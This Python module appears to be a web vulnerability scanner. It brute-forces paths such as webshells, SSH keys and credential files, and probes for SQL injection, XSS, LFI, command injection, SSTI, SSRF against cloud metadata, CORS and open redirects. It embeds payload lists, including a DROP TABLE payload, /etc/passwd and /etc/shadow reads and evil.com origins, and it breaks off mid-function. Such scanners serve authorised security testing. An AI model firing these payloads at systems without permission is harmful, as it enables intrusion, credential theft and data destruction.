import socket
import ssl
import re
from datetime import datetime

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

WORDLISTS = {
    "common": [
        "admin", "login", "dashboard", "wp-admin", "wp-login.php", "administrator",
        "phpmyadmin", "panel", "cpanel", "webmail", "mail", "ftp", "upload",
        "uploads", "images", "img", "css", "js", "static", "media", "files",
        "backup", "backups", "old", "new", "test", "dev", "staging", "api",
        "v1", "v2", "v3", "swagger", "docs", "documentation", "help", "support",
        "user", "users", "account", "accounts", "profile", "register", "signup",
        "signin", "logout", "config", "configuration", "settings", "setup",
        ".git", ".env", ".htaccess", "robots.txt", "sitemap.xml", "crossdomain.xml",
        "server-status", "server-info", "phpinfo.php", "info.php", "readme.txt",
        "README.md", "CHANGELOG", "LICENSE", "Makefile", "package.json",
        "composer.json", "requirements.txt", "Dockerfile", ".dockerignore",
        "error_log", "access_log", "debug.log", "app.log",
    ],
    "extended": [
        "shell.php", "cmd.php", "webshell.php", "backdoor.php", "c99.php", "r57.php",
        "upload.php", "file_manager.php", "manager.php", "filemanager",
        "adminer.php", "adminer", "db.php", "database.php", "sql.php",
        "passwd", "shadow", "id_rsa", "id_dsa", ".bash_history", ".ssh",
        "wp-config.php", "config.php", "configuration.php", "settings.php",
        "local.xml", "config.xml", "web.config", "appsettings.json",
        "dump.sql", "backup.sql", "db_backup.sql", "database.sql",
        "aws.json", "credentials", ".aws", "google-services.json",
        "actuator", "actuator/env", "actuator/health", "actuator/mappings",
        "graphql", "graphiql", "api/graphql", "_graphql", "api/v1/users",
        "api/v2/users", "api/admin", "api/debug", "api/config",
        "console", "rails/info/properties", "telescope", "horizon",
        "_profiler", "_wdt", "trace", "metrics", "health", "info",
        "status", "ping", "version", "env", "debug", "trace",
    ],
}

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1; SELECT SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "'; DROP TABLE users--",
    "1 AND 1=1", "1 AND 1=2",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "you have an error in your sql",
    "warning: mysql", "unclosed quotation mark", "quoted string not properly terminated",
    "syntax error", "ora-", "pg_query", "sqlite_", "microsoft ole db",
    "odbc sql", "jdbc", "sqlstate", "db2 sql", "invalid query",
    "supplied argument is not a valid mysql", "column count doesn't match",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "\"><img src=1 onerror=alert(1)>",
]


def _req(url, **kwargs):
    if not REQUESTS_AVAILABLE:
        raise RuntimeError("requests not installed")
    import requests as req
    return req.get(url, timeout=8, verify=False, **kwargs)


# ─── False-positive prevention helpers ──────────────────────────────────────

def _fetch_baseline(url: str, session=None):
    """Fetch a known-random-nonexistent path to detect soft-404 / SPA behavior.
    Returns dict {status, size, hash, text_lower, url}."""
    import hashlib, secrets
    if not REQUESTS_AVAILABLE:
        return None
    try:
        import requests as req
        s = session or req
        rand_path = "/__wouapit_nonexistent_" + secrets.token_hex(6)
        from urllib.parse import urlparse
        p = urlparse(url)
        origin = f"{p.scheme}://{p.netloc}"
        probe_url = origin + rand_path
        r = s.get(probe_url, timeout=6, verify=False, allow_redirects=False)
        body = r.text[:8000]
        return {
            "status":     r.status_code,
            "size":       len(r.content),
            "hash":       hashlib.md5(body.encode(errors="ignore")).hexdigest(),
            "text_lower": body.lower(),
            "url":        probe_url,
        }
    except Exception:
        return None


def _fetch_positive_baseline(url: str, session=None):
    """Fetch the actual target URL as a known-good baseline for differential checks."""
    import hashlib
    if not REQUESTS_AVAILABLE:
        return None
    try:
        import requests as req
        s = session or req
        r = s.get(url, timeout=8, verify=False, allow_redirects=False)
        body = r.text[:20000]
        return {
            "status":       r.status_code,
            "size":         len(r.content),
            "text":         body,
            "text_lower":   body.lower(),
            "hash":         hashlib.md5(body.encode(errors="ignore")).hexdigest(),
            "content_type": r.headers.get("Content-Type", ""),
        }
    except Exception:
        return None


def _is_soft_404(response, negative_baseline) -> bool:
    """True if response looks identical to a known-nonexistent path (SPA behavior)."""
    if not negative_baseline:
        return False
    if response.status_code != negative_baseline["status"]:
        return False
    size_diff = abs(len(response.content) - negative_baseline["size"])
    max_size  = max(len(response.content), negative_baseline["size"], 1)
    if size_diff / max_size < 0.10:
        return True
    import hashlib
    body_hash = hashlib.md5(response.text[:8000].encode(errors="ignore")).hexdigest()
    return body_hash == negative_baseline["hash"]


def dir_bruteforce(base_url: str, wordlist_key: str = "common") -> dict:
    """Directory bruteforce with soft-404 detection to prevent false positives.
    Skips SPA/Vercel-style apps that return 200 for every route."""
    import hashlib
    if not base_url.startswith(("http://", "https://")):
        base_url = "https://" + base_url
    base_url = base_url.rstrip("/")

    result = {
        "target":    base_url,
        "timestamp": datetime.utcnow().isoformat(),
        "found":     [],
        "errors":    [],
        "info":      [],
    }
    words = WORDLISTS.get(wordlist_key, WORDLISTS["common"])

    if not REQUESTS_AVAILABLE:
        return {"error": "requests library not installed"}

    import requests as req
    session = req.Session()
    session.verify = False

    baseline = _fetch_baseline(base_url, session)
    if baseline:
        result["baseline"] = {
            "probe_path": baseline["url"],
            "status":     baseline["status"],
            "size":       baseline["size"],
        }
        if baseline["status"] == 200:
            result["info"].append(
                f"SPA/soft-404 detected: random path returned 200 with {baseline['size']} bytes. "
                "Only paths returning genuinely different content are reported."
            )

    for word in words:
        url = f"{base_url}/{word}"
        try:
            r = session.get(url, timeout=5, allow_redirects=False)
            if r.status_code in (404, 400):
                continue
            if _is_soft_404(r, baseline):
                continue
            body_hash = hashlib.md5(r.text[:8000].encode(errors="ignore")).hexdigest()
            if baseline and body_hash == baseline["hash"]:
                continue
            confidence = "HIGH"
            if r.status_code in (301, 302, 303, 307, 308):
                confidence = "MEDIUM"
            if r.status_code in (401, 403):
                confidence = "HIGH"
            result["found"].append({
                "url":        url,
                "status":     r.status_code,
                "size":       len(r.content),
                "redirect":   r.headers.get("Location", ""),
                "confidence": confidence,
                "verified":   True,
            })
        except Exception as e:
            result["errors"].append(str(e)[:80])

    result["count"]   = len(result["found"])
    result["scanned"] = len(words)
    if not result["found"] and baseline and baseline["status"] == 200:
        result["info"].append(
            "No paths differed from soft-404 baseline. Target uses SPA routing — dir bruteforce not effective. "
            "Manual review recommended."
        )
    return result


def sqli_test(url: str) -> dict:
    """SQLi test with baseline differential. Only flags when error signature
    appears in test response AND does not appear in baseline (rules out static content)."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    result = {"target": url, "timestamp": datetime.utcnow().isoformat(),
              "vulnerabilities": [], "info": [], "baseline": {}}

    if not REQUESTS_AVAILABLE:
        return {"error": "requests library not installed"}

    import requests as req
    session = req.Session(); session.verify = False

    # Baseline: fetch target once to capture normal content
    baseline = _fetch_positive_baseline(url, session)
    if not baseline:
        result["info"].append("Could not fetch baseline — skipping SQLi test.")
        return result
    result["baseline"] = {"status": baseline["status"], "size": baseline["size"]}

    # Extract existing params or default to id
    import re as _re
    from urllib.parse import urlparse, parse_qs
    parsed = urlparse(url)
    existing_params = list(parse_qs(parsed.query).keys())
    param_name = existing_params[0] if existing_params else "id"

    # Pre-check: if baseline already contains any SQL error string, skip that error
    baseline_errors_present = [e for e in SQLI_ERRORS if e in baseline["text_lower"]]
    usable_errors = [e for e in SQLI_ERRORS if e not in baseline_errors_present]

    if baseline_errors_present:
        result["info"].append(
            f"Baseline already contains SQL keywords: {baseline_errors_present[:3]}. "
            "These are excluded to avoid false positives."
        )

    for payload in SQLI_PAYLOADS[:8]:
        sep = "&" if "?" in url else "?"
        test_url = url + f"{sep}{param_name}={payload}"
        try:
            r = session.get(test_url, timeout=8, allow_redirects=False)
            body_lower = r.text.lower()
            for err in usable_errors:
                if err in body_lower:
                    # Second confirmation: submit a benign value and verify error does NOT appear
                    benign_url = url + f"{sep}{param_name}=1"
                    r2 = session.get(benign_url, timeout=6, allow_redirects=False)
                    if err in r2.text.lower():
                        # Error appears with benign value too — false positive, static content
                        continue
                    result["vulnerabilities"].append({
                        "type":       "SQL Injection",
                        "payload":    payload,
                        "parameter":  param_name,
                        "evidence":   f"Error string '{err}' present with payload but absent with benign value",
                        "url":        test_url,
                        "severity":   "CRITICAL",
                        "confidence": "HIGH",
                        "verified":   True,
                        "reproduce":  f"curl '{test_url}'  vs  curl '{benign_url}'",
                    })
                    break
        except Exception:
            pass

    if not result["vulnerabilities"]:
        result["info"].append(
            "No confirmed SQL injection. Tested payloads on a synthetic parameter — "
            "manual testing of real form parameters recommended."
        )
    return result


def xss_test(url: str) -> dict:
    """Reflected XSS test with baseline + context verification.
    Only flags when payload appears UNESCAPED in the response AND does not appear in baseline."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    result = {"target": url, "timestamp": datetime.utcnow().isoformat(),
              "vulnerabilities": [], "info": [], "baseline": {}}

    if not REQUESTS_AVAILABLE:
        return {"error": "requests library not installed"}

    import requests as req
    session = req.Session(); session.verify = False

    baseline = _fetch_positive_baseline(url, session)
    if not baseline:
        result["info"].append("Could not fetch baseline — skipping XSS test.")
        return result
    result["baseline"] = {"status": baseline["status"], "size": baseline["size"]}

    from urllib.parse import urlparse, parse_qs
    parsed = urlparse(url)
    existing_params = list(parse_qs(parsed.query).keys())
    param_name = existing_params[0] if existing_params else "q"

    # Test each payload
    import secrets, html as _html
    marker = "wouapit_" + secrets.token_hex(4)

    for payload in XSS_PAYLOADS:
        # Inject a unique marker inside the payload so we can verify OUR payload was reflected
        marked_payload = payload.replace("XSS", marker).replace("alert(1)", f"alert('{marker}')")
        sep = "&" if "?" in url else "?"
        test_url = url + f"{sep}{param_name}={marked_payload}"
        try:
            r = session.get(test_url, timeout=8, allow_redirects=False)
            body = r.text

            # Check 1: marker present at all?
            if marker not in body:
                continue

            # Check 2: is the RAW payload (with dangerous chars) reflected?
            # If server escapes to &lt;script&gt;, HTML-decoded body won't contain the raw tag
            dangerous_snippet = marked_payload.split(">")[0] + ">" if ">" in marked_payload else marked_payload
            # Look for the literal dangerous chars (not escaped)
            payload_lower = marked_payload.lower()

            # If the response HTML-encodes < to &lt; then the raw payload is NOT present
            if payload_lower not in body.lower():
                # Only the marker leaked — safely encoded
                continue

            # Check 3: baseline didn't already contain this pattern
            if payload_lower in baseline["text_lower"]:
                continue

            # Check 4: content-type is HTML (JSON responses aren't XSS-exploitable)
            ctype = r.headers.get("Content-Type", "").lower()
            if "html" not in ctype and "xml" not in ctype:
                result["info"].append(
                    f"Payload reflected in non-HTML response ({ctype}) — not exploitable as XSS."
                )
                continue

            # Confirmed reflected XSS
            result["vulnerabilities"].append({
                "type":       "Reflected XSS",
                "payload":    marked_payload,
                "parameter":  param_name,
                "url":        test_url,
                "evidence":   f"Payload '{payload}' reflected unescaped in HTML response",
                "severity":   "HIGH",
                "confidence": "HIGH",
                "verified":   True,
                "reproduce":  f"curl '{test_url}' | grep '{marker}'",
            })
        except Exception:
            pass

    if not result["vulnerabilities"]:
        result["info"].append(
            "No reflected XSS confirmed. Payload either not reflected, or reflected in escaped form (safe)."
        )
    return result


def ssl_check(host: str) -> dict:
    if host.startswith(("http://", "https://")):
        host = re.sub(r"https?://", "", host).split("/")[0]

    result = {"host": host, "timestamp": datetime.utcnow().isoformat()}
    port = 443

    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert   = ssock.getpeercert()
                cipher = ssock.cipher()
                proto  = ssock.version()
                result["valid"]      = True
                result["protocol"]   = proto
                result["cipher"]     = {"name": cipher[0], "protocol": cipher[1], "bits": cipher[2]}
                result["subject"]    = dict(x[0] for x in cert.get("subject", []))
                result["issuer"]     = dict(x[0] for x in cert.get("issuer", []))
                result["not_before"] = cert.get("notBefore")
                result["not_after"]  = cert.get("notAfter")
                result["san"]        = [v for t, v in cert.get("subjectAltName", [])]
                issues = []
                if proto in ("SSLv2", "SSLv3", "TLSv1", "TLSv1.1"):
                    issues.append(f"Outdated protocol: {proto}")
                if cipher[2] and cipher[2] < 128:
                    issues.append(f"Weak cipher key length: {cipher[2]} bits")
                result["issues"] = issues
    except ssl.SSLCertVerificationError as e:
        result["valid"] = False
        result["error"] = str(e)
    except Exception as e:
        result["error"] = str(e)

    return result


TECH_SIGNATURES = {
    "WordPress": ["wp-content", "wp-includes", "WordPress"],
    "Joomla": ["joomla", "/components/com_"],
    "Drupal": ["Drupal", "/sites/default/"],
    "Laravel": ["laravel_session", "Laravel"],
    "Django": ["csrftoken", "django"],
    "React": ["react", "ReactDOM", "__react"],
    "Vue.js": ["vue.js", "Vue.js", "__vue"],
    "Angular": ["ng-version", "angular.js"],
    "jQuery": ["jquery", "jQuery"],
    "Bootstrap": ["bootstrap.css", "bootstrap.min.css"],
    "Nginx": ["nginx"],
    "Apache": ["Apache", "apache"],
    "IIS": ["Microsoft-IIS"],
    "PHP": ["X-Powered-By: PHP", ".php"],
    "ASP.NET": ["ASP.NET", "X-AspNet"],
    "Node.js": ["X-Powered-By: Express", "Express"],
    "Cloudflare": ["cf-ray", "cloudflare"],
    "AWS": ["x-amz-", "AmazonS3", "cloudfront"],
}


def tech_detect(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "technologies": []}

    if not REQUESTS_AVAILABLE:
        return {"error": "requests library not installed"}

    try:
        import requests as req
        r = req.get(url, timeout=10, verify=False)
        content     = r.text
        headers_str = str(r.headers).lower()
        all_text    = content + headers_str

        for tech, sigs in TECH_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in all_text.lower():
                    if tech not in result["technologies"]:
                        result["technologies"].append(tech)
                    break

        result["server"]       = r.headers.get("Server", "Unknown")
        result["powered_by"]   = r.headers.get("X-Powered-By", "Not disclosed")
        result["status_code"]  = r.status_code
        result["content_type"] = r.headers.get("Content-Type", "Unknown")
    except Exception as e:
        result["error"] = str(e)

    return result


# ── New attack tools ──────────────────────────────────────────────────────────

CORS_ORIGINS = [
    "https://evil.com", "https://attacker.com", "null",
    "https://trusted.com.evil.com", "http://localhost",
]

def cors_check(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        for origin in CORS_ORIGINS:
            r = req.get(url, headers={"Origin": origin}, timeout=8, verify=False)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
            if acao == origin or acao == "*":
                severity = "HIGH" if (acac == "true" and acao != "*") else "MEDIUM"
                result["vulnerabilities"].append({
                    "type": "CORS Misconfiguration",
                    "origin_tested": origin,
                    "acao_header": acao,
                    "credentials_allowed": acac == "true",
                    "severity": severity,
                    "evidence": f"Origin: {origin} → ACAO: {acao}, ACAC: {acac}",
                    "remediation": "Restrict Access-Control-Allow-Origin to trusted origins only.",
                })
        result["info"].append(f"Tested {len(CORS_ORIGINS)} origins")
    except Exception as e:
        result["error"] = str(e)
    return result


REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnUrl", "goto",
                   "dest", "destination", "continue", "redir", "redirect_uri", "back"]

def open_redirect_test(url: str) -> dict:
    """Open redirect — require actual 3xx status AND Location header pointing to attacker domain."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        session = req.Session(); session.verify = False
        payloads = ["https://evil.com", "//evil.com", r"\/\/evil.com"]
        for param in REDIRECT_PARAMS[:6]:
            for payload in payloads[:2]:
                sep = "&" if "?" in url else "?"
                test_url = url + f"{sep}{param}={payload}"
                try:
                    r = session.get(test_url, timeout=5, allow_redirects=False)
                    loc = r.headers.get("Location", "")
                    # Require actual redirect status (not just Location echo) + evil.com in Location
                    if r.status_code in (301,302,303,307,308) and "evil.com" in loc.lower():
                        # Confirm: benign value does NOT produce the same redirect
                        benign = session.get(url + f"{sep}{param}=/home",
                                             timeout=5, allow_redirects=False)
                        if "evil.com" in benign.headers.get("Location","").lower():
                            continue
                        result["vulnerabilities"].append({
                            "type":       "Open Redirect",
                            "parameter":  param, "payload": payload,
                            "location_header": loc, "status": r.status_code,
                            "severity":   "MEDIUM", "url": test_url,
                            "confidence": "HIGH", "verified": True,
                            "reproduce":  f"curl -I '{test_url}' → Location: {loc}",
                            "remediation":"Validate and whitelist redirect destinations server-side.",
                        })
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No open redirects confirmed (require actual 3xx + attacker domain in Location).")
    except Exception as e:
        result["error"] = str(e)
    return result


def clickjacking_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "vulnerable": False,
              "info": {}, "vulnerabilities": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        r = req.get(url, timeout=8, verify=False)
        xfo           = r.headers.get("X-Frame-Options", "MISSING")
        csp           = r.headers.get("Content-Security-Policy", "")
        has_csp_frame = "frame-ancestors" in csp.lower()
        result["info"] = {
            "X-Frame-Options": xfo,
            "CSP-frame-ancestors": "present" if has_csp_frame else "MISSING",
        }
        if xfo == "MISSING" and not has_csp_frame:
            result["vulnerable"] = True
            result["vulnerabilities"].append({
                "type": "Clickjacking",
                "severity": "MEDIUM",
                "evidence": "X-Frame-Options: MISSING, CSP frame-ancestors: MISSING",
                "remediation": "Add X-Frame-Options: DENY or CSP: frame-ancestors 'none'.",
            })
    except Exception as e:
        result["error"] = str(e)
    return result


HTTP_DANGEROUS = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT", "DEBUG", "MOVE"]

def http_methods_test(url: str) -> dict:
    """HTTP methods — only 2xx counts as truly 'allowed'.
    3xx/401/403 mean the server received the method but blocked/redirected — NOT allowed."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "allowed": [], "dangerous": [], "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        session = req.Session(); session.verify = False

        # Baseline: what does GET return? Some servers return 200 for any method.
        get_r = session.get(url, timeout=5, allow_redirects=False)
        get_status = get_r.status_code
        get_size = len(get_r.content)

        for method in HTTP_DANGEROUS + ["GET", "HEAD", "POST", "OPTIONS"]:
            try:
                r = session.request(method, url, timeout=5, allow_redirects=False)
                # Only 2xx = truly allowed. 3xx/4xx/5xx = server saw the method and handled it (usually blocked)
                if r.status_code < 200 or r.status_code >= 300:
                    continue
                # If dangerous method returns same status+size as GET, server likely ignored the method
                if method in HTTP_DANGEROUS and r.status_code == get_status and abs(len(r.content) - get_size) < 50:
                    result["info"].append(
                        f"{method} returned identical response to GET — server likely ignored method (not truly allowed)."
                    )
                    continue
                result["allowed"].append({"method": method, "status": r.status_code})
                if method in HTTP_DANGEROUS:
                    result["dangerous"].append(method)
                    result["vulnerabilities"].append({
                        "type":       f"Dangerous HTTP Method: {method}",
                        "severity":   "HIGH" if method in ("PUT","DELETE","DEBUG","TRACE") else "MEDIUM",
                        "evidence":   f"{method} returned HTTP {r.status_code} (differs from GET baseline)",
                        "confidence": "MEDIUM",
                        "verified":   True,
                        "reproduce":  f"curl -X {method} '{url}' -i",
                        "remediation":f"Disable {method} on the web server configuration.",
                    })
            except Exception:
                pass
    except Exception as e:
        result["error"] = str(e)
    return result


LFI_PAYLOADS = [
    "../../../etc/passwd", "../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd",
    "../../../windows/win.ini", "..\\..\\..\\windows\\win.ini",
    "/etc/passwd", "/etc/hosts", "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "../../../etc/shadow", "/var/log/apache2/access.log",
]
LFI_INDICATORS = ["root:x:", "daemon:", "[extensions]", "www-data", "/bin/bash",
                  "/bin/sh", "proc/self", "[boot loader]", "/sbin/nologin"]

def lfi_test(url: str) -> dict:
    """LFI test with baseline check. Only flags when indicator appears with payload
    AND does not appear in baseline (rules out static content containing the string)."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    import requests as req
    session = req.Session(); session.verify = False

    baseline = _fetch_positive_baseline(url, session)
    if not baseline:
        result["info"].append("Could not fetch baseline — skipping LFI test.")
        return result

    # Filter out indicators already in baseline (false positive source)
    baseline_indicators = [i for i in LFI_INDICATORS if i in baseline["text"]]
    usable_indicators = [i for i in LFI_INDICATORS if i not in baseline_indicators]
    if baseline_indicators:
        result["info"].append(
            f"Baseline contains indicators {baseline_indicators[:3]} — excluded to avoid false positives."
        )

    try:
        params = ["file","page","path","include","template","doc","document","view","load","read","lang"]
        for param in params[:5]:
            for payload in LFI_PAYLOADS[:6]:
                sep = "&" if "?" in url else "?"
                test_url = url + f"{sep}{param}={payload}"
                try:
                    r = session.get(test_url, timeout=6, allow_redirects=False)
                    for ind in usable_indicators:
                        if ind in r.text:
                            # Confirm: benign value must NOT produce indicator
                            benign_url = url + f"{sep}{param}=index.html"
                            r2 = session.get(benign_url, timeout=6, allow_redirects=False)
                            if ind in r2.text:
                                continue  # false positive — indicator is not payload-triggered
                            result["vulnerabilities"].append({
                                "type":       "Local File Inclusion (LFI)",
                                "parameter":  param, "payload": payload,
                                "indicator":  ind, "severity": "CRITICAL",
                                "url":        test_url,
                                "confidence": "HIGH", "verified": True,
                                "reproduce":  f"curl '{test_url}' | grep '{ind}'",
                                "remediation":"Sanitise file path inputs. Use whitelists. Disable allow_url_include.",
                            })
                            break
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No confirmed LFI. Target may not have file-inclusion functionality.")
    except Exception as e:
        result["error"] = str(e)
    return result


CMD_PAYLOADS = [
    (";id",       ["uid=", "gid="]),
    ("|id",       ["uid=", "gid="]),
    ("&&id",      ["uid=", "gid="]),
    (";whoami",   ["root", "www-data", "apache", "nobody"]),
    ("|whoami",   ["root", "www-data", "apache"]),
    ("$(id)",     ["uid=", "gid="]),
    ("`id`",      ["uid=", "gid="]),
    (";sleep 3",  []),   # time-based
]

def cmd_injection_test(url: str) -> dict:
    """Command injection with baseline + timing baseline to prevent false positives."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}

    import requests as req, time
    session = req.Session(); session.verify = False

    baseline = _fetch_positive_baseline(url, session)
    if not baseline:
        result["info"].append("Could not fetch baseline — skipping cmd injection.")
        return result

    # Measure baseline response time (2 samples)
    t0 = time.time(); session.get(url, timeout=8, verify=False, allow_redirects=False); t1 = time.time()
    baseline_time = t1 - t0

    try:
        params = ["cmd","exec","command","run","ping","host","ip","query","search","input","c"]
        for param in params[:4]:
            for payload, indicators in CMD_PAYLOADS[:6]:
                sep = "&" if "?" in url else "?"
                test_url = url + f"{sep}{param}={payload}"
                try:
                    t0 = time.time()
                    r  = session.get(test_url, timeout=10, allow_redirects=False)
                    elapsed = time.time() - t0
                    for ind in indicators:
                        if ind in r.text and ind not in baseline["text"]:
                            # Confirm with benign value
                            r2 = session.get(url + f"{sep}{param}=test", timeout=6, allow_redirects=False)
                            if ind in r2.text:
                                continue
                            result["vulnerabilities"].append({
                                "type":       "Command Injection",
                                "parameter":  param, "payload": payload,
                                "indicator":  ind, "severity": "CRITICAL",
                                "url":        test_url,
                                "confidence": "HIGH", "verified": True,
                                "reproduce":  f"curl '{test_url}' | grep '{ind}'",
                                "remediation":"Never pass user input to shell commands.",
                            })
                            break
                    # Blind time-based — require significant delta vs baseline (not absolute threshold)
                    if not indicators and elapsed > baseline_time + 2.5:
                        # Re-run to confirm delay is reproducible
                        t0b = time.time()
                        session.get(test_url, timeout=10, allow_redirects=False)
                        elapsed2 = time.time() - t0b
                        if elapsed2 > baseline_time + 2.0:
                            result["vulnerabilities"].append({
                                "type":       "Blind Command Injection (time-based)",
                                "parameter":  param, "payload": payload,
                                "severity":   "CRITICAL", "url": test_url,
                                "evidence":   f"Delay {elapsed:.1f}s (2nd run {elapsed2:.1f}s) vs baseline {baseline_time:.1f}s",
                                "confidence": "MEDIUM",
                                "verified":   True,
                            })
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No confirmed command injection.")
    except Exception as e:
        result["error"] = str(e)
    return result


SSTI_PAYLOADS = [
    ("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"), ("{{7*'7'}}", "7777777"), ("*{7*7}", "49"),
    ("{{config}}", "SECRET"), ("{php}echo(7*7);{/php}", "49"),
]

def ssti_test(url: str) -> dict:
    """SSTI with differential math + baseline check.
    Requires BOTH {{7*7}}=49 AND {{8*8}}=64 to appear (differential proof of evaluation)."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    import requests as req
    session = req.Session(); session.verify = False

    baseline = _fetch_positive_baseline(url, session)
    if not baseline:
        result["info"].append("Could not fetch baseline — skipping SSTI.")
        return result

    # Numbers that likely appear on the site normally (dates, prices) shouldn't be counted
    baseline_has_49 = "49" in baseline["text"]
    baseline_has_64 = "64" in baseline["text"]
    baseline_has_7777777 = "7777777" in baseline["text"]

    if baseline_has_49 and baseline_has_64:
        result["info"].append(
            "Baseline already contains both '49' and '64' — SSTI test unreliable on this target."
        )
        return result

    try:
        params = ["name","template","message","query","q","search","input","text","content","subject"]
        # Test pairs: (payload_A, expected_A, payload_B, expected_B) — need BOTH to match
        differential_pairs = [
            ("{{7*7}}",   "49", "{{8*8}}",   "64"),
            ("${7*7}",    "49", "${8*8}",    "64"),
            ("{{7*'7'}}", "7777777", "{{6*'6'}}", "666666"),
        ]
        for param in params[:4]:
            for pa, ea, pb, eb in differential_pairs:
                sep = "&" if "?" in url else "?"
                url_a = url + f"{sep}{param}={pa}"
                url_b = url + f"{sep}{param}={pb}"
                try:
                    ra = session.get(url_a, timeout=6, allow_redirects=False)
                    rb = session.get(url_b, timeout=6, allow_redirects=False)
                    a_hit = (ea in ra.text) and (baseline["text"].count(ea) < ra.text.count(ea))
                    b_hit = (eb in rb.text) and (baseline["text"].count(eb) < rb.text.count(eb))
                    if a_hit and b_hit:
                        result["vulnerabilities"].append({
                            "type":       "Server-Side Template Injection (SSTI)",
                            "parameter":  param, "payload_a": pa, "payload_b": pb,
                            "evidence":   f"Both {pa}={ea} and {pb}={eb} evaluated server-side",
                            "severity":   "CRITICAL", "url": url_a,
                            "confidence": "HIGH", "verified": True,
                            "reproduce":  f"curl '{url_a}' → contains {ea}; curl '{url_b}' → contains {eb}",
                            "remediation":"Use sandboxed template engines. Never pass user input to templates.",
                        })
                        break
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No SSTI confirmed (differential test requires both math expressions to evaluate).")
    except Exception as e:
        result["error"] = str(e)
    return result


SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
]
SSRF_INDICATORS = ["ami-id", "instance-id", "computeMetadata", "local-hostname",
                   "iam/security-credentials", "meta-data", "placement"]

def ssrf_test(url: str) -> dict:
    """SSRF with baseline — filter indicators that appear in normal page content."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    import requests as req
    session = req.Session(); session.verify = False

    baseline = _fetch_positive_baseline(url, session)
    if not baseline:
        result["info"].append("Could not fetch baseline — skipping SSRF.")
        return result
    baseline_indicators = [i for i in SSRF_INDICATORS if i in baseline["text"]]
    usable_indicators = [i for i in SSRF_INDICATORS if i not in baseline_indicators]

    try:
        params = ["url","link","src","source","dest","destination","fetch","load","uri","resource","file"]
        for param in params[:4]:
            for target in SSRF_TARGETS[:3]:
                sep = "&" if "?" in url else "?"
                test_url = url + f"{sep}{param}={target}"
                try:
                    r = session.get(test_url, timeout=6, allow_redirects=False)
                    for ind in usable_indicators:
                        if ind in r.text:
                            # Confirm with benign URL
                            r2 = session.get(url + f"{sep}{param}=https://example.com",
                                             timeout=6, allow_redirects=False)
                            if ind in r2.text:
                                continue
                            result["vulnerabilities"].append({
                                "type":       "Server-Side Request Forgery (SSRF)",
